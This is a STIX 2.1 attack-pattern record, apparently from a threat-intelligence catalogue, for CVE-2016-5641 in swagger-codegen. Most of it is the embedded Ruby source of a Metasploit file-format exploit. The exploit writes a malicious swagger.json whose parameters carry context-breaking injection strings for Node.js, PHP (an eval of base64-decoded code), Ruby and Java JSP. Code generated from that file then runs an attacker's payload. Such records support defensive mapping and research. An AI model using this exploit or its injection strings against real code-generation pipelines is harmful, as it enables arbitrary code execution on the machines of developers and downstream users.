{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1eca76c2-dc6a-46d0-b2fe-555e0246884a",
    "created": "2024-08-14T17:05:08.423243Z",
    "modified": "2024-08-14T17:05:08.423247Z",
    "name": "JSON Swagger CodeGen Parameter Injector",
    "description": " This module generates an Open API Specification 2.0 (Swagger) compliant json document that includes payload insertion points in parameters.  In order for the payload to be executed, an attacker must convince someone to generate code from a specially modified swagger.json file within a vulnerable swagger-codgen appliance/container/api/service and then to execute that generated code (or include it into software which will later be executed by another victim). By doing so, an attacker can execute arbitrary code as the victim user. The same vulnerability exists in the YAML format.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/fileformat/swagger_param_inject.rb",
            "external_id": "swagger_param_inject.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-5641"
        },
        {
            "source_name": "reference",
            "url": "http://github.com/swagger-api/swagger-codegen"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2016/06/23/r7-2016-06-remote-code-execution-via-swagger-parameter-injection-cve-2016-5641"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n#\n# Gems\n#\nrequire 'base64'\n\n#\n# Project\n#\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'JSON Swagger CodeGen Parameter Injector',\n      'Description'    => %q{\n        This module generates an Open API Specification 2.0 (Swagger) compliant\n        json document that includes payload insertion points in parameters.\n\n        In order for the payload to be executed, an attacker must convince\n        someone to generate code from a specially modified swagger.json file\n        within a vulnerable swagger-codgen appliance/container/api/service,\n        and then to execute that generated code (or include it into software\n        which will later be executed by another victim). By doing so, an\n        attacker can execute arbitrary code as the victim user. The same\n        vulnerability exists in the YAML format.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'ethersnowman <scott_davis@rapid7.com>'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2016-5641' ],\n          [ 'URL', 'http://github.com/swagger-api/swagger-codegen' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2016/06/23/r7-2016-06-remote-code-execution-via-swagger-parameter-injection-cve-2016-5641' ]\n        ],\n      'Platform'       => %w{ nodejs php java ruby },\n      'Arch'           => [ ARCH_NODEJS, ARCH_PHP, ARCH_JAVA, ARCH_RUBY ],\n      'Targets'        =>\n        [\n          ['NodeJS', { 'Platform' => 'nodejs', 'Arch' => ARCH_NODEJS } ],\n          ['PHP', { 'Platform' => 'php', 'Arch' => ARCH_PHP } ],\n          ['Java JSP', { 'Platform' => 'unix', 'Arch' => ARCH_JAVA } ],\n          ['Ruby', { 'Platform' => 'ruby', 'Arch' => ARCH_RUBY } ]\n        ],\n      'DisclosureDate' => '2016-06-23',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [false, 'The file to write.', 'msf-swagger.json']),\n        OptString.new('INFO_DESCRIPTION', [true, 'Swagger info description', 'A']),\n        OptString.new('INFO_VERSION', [true, 'Swagger info version.', '1.0.0']),\n        OptString.new('INFO_TITLE', [true, 'Swagger info title.', 'C']),\n        OptEnum.new('SWAGGER_SCHEME', [true, 'Protocol scheme', 'http', ['http','https','ws','wss']]),\n        OptString.new('SWAGGER_HOST', [true, 'a valid hostname or IPv4']),\n        OptString.new('BASE_PATH', [true, 'The root path of API on host.', '/']),\n        OptString.new('PATH', [true, 'Path of request/response on root path.', '/a']),\n        OptString.new('PATH_DESCRIPTION', [true, 'Description of a path request object', 'D']),\n        OptString.new('PATH_RESPONSE_DESCRIPTION', [true, 'Description of a path response object', 'E']),\n        OptString.new('DEFINITION_DESCRIPTION', [true, 'Description of an object definition.', 'F'])\n      ])\n  end\n\n  def swagger\n    %Q(\n      {\n          \"swagger\": \"2.0\",\n          \"info\": {\n              \"description\": \"#{datastore['INFO_DESCRIPTION']}\",\n              \"version\": \"#{datastore['INFO_VERSION']}\",\n              \"title\": \"#{datastore['INFO_TITLE']}\"\n          },\n          \"schemes\": [\n              \"#{datastore['SWAGGER_SCHEME']}\"\n          ],\n          \"host\": \"#{datastore['SWAGGER_HOST']}\",\n          \"basePath\": \"#{datastore['BASE_PATH']}\",\n          \"produces\": [\n              \"application/json\"\n          ],\n          \"consumes\": [\n              \"application/json\"\n          ],\n          \"paths\": {\n              \"#{datastore['PATH']}\": {\n                  \"get\": {\n                      \"description\": \"#{datastore['PATH_DESCRIPTION']}\",\n                      \"responses\": {\n                          \"200\": {\n                              \"description\": \"#{datastore['PATH_RESPONSE_DESCRIPTION']}\",\n                              \"schema\": {\n                                  \"$ref\": \"#/definitions/d\"\n                              }\n                          }\n                      }\n                  }\n              }\n          },\n          \"definitions\": {\n              \"d\": {\n                  \"type\": \"object\",\n                  \"description\": \"#{datastore['DEFINITION_DESCRIPTION']}\",\n                  \"properties\": {\n                      \"id\": {\n                          \"type\": \"integer\",\n                          \"format\": \"int64\"\n                      }\n                  }\n              }\n          }\n      }\n    )\n  end\n\n  def exploit\n    case payload.arch[0]\n    when 'nodejs'\n      payload_loc = 'PATH'\n      payload_prefix = \"/a');};};return exports;}));\"\n      payload_suffix = \"(function(){}(this,function(){a=function(){b=function(){new Array('\"\n      wrapped_payload = payload_prefix + payload.encoded.gsub(/\"/, '\\\\\"') + payload_suffix\n    when 'php'\n      payload_loc = 'INFO_DESCRIPTION'\n      payload_prefix = \"*/ namespace foobar; eval(base64_decode('\"\n      payload_suffix = \"')); /*\"\n      wrapped_payload = payload_prefix +\n        Base64.strict_encode64(payload.encoded) +\n        payload_suffix\n    when 'ruby'\n      payload_loc = 'INFO_TITLE'\n      payload_prefix = \"=end \"\n      payload_suffix = \"=begin \"\n      wrapped_payload = payload_prefix + payload.encoded + payload_suffix\n    when 'java'\n      payload_loc = 'PATH'\n      payload_prefix = %q{a\\\\\\\"; \"}\n      p = payload.encoded.gsub(/<%@page import=\"/, 'import ')\n      p = p.gsub(/\\\"%>/, ';').gsub(/<%/, '').gsub(/%>/, '')\n      p = p.gsub(/\"/, '\\\\\"').gsub(/\\n/, ' ')\n      wrapped_payload = payload_prefix + p\n    else\n      raise IncompatiblePayloadError.new(datastore['PAYLOAD'])\n    end\n\n    datastore[payload_loc] = wrapped_payload\n\n    print_status swagger\n    file_create swagger\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-06-23",
    "x_mitre_platforms": [
        "%w{ nodejs php java ruby }"
    ]
}